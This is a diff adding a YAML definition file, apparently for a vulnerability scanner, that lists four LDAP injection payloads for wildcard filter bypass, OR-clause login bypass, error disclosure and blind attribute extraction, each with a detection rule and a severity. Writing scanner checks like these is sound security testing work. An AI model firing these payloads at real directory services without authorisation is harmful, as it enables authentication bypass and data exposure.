@@ -1,0 +1,33 @@
+id: ldap-inject
+name: LDAP injection
+context:
+  any: true
+
+payloads:
+  - value: "*)(objectClass=*"
+    detect: { status_change: true }
+    id: ldap-wildcard-01
+    title: "LDAP injection — wildcard filter bypass"
+    severity: high
+    cwe: CWE-90
+
+  - value: "*)(&"
+    detect: { body_regex: "LDAP|ldap|directory" }
+    id: ldap-error-01
+    title: "LDAP injection — filter syntax error disclosure"
+    severity: high
+    cwe: CWE-90
+
+  - value: "admin)(|(password=*)"
+    detect: { status_change: true }
+    id: ldap-or-01
+    title: "LDAP injection — OR filter bypass"
+    severity: critical
+    cwe: CWE-90
+
+  - value: "*)(uid=*))(|(uid=*"
+    detect: { status_change: true }
+    id: ldap-blind-01
+    title: "LDAP injection — blind attribute extraction"
+    severity: high
+    cwe: CWE-90
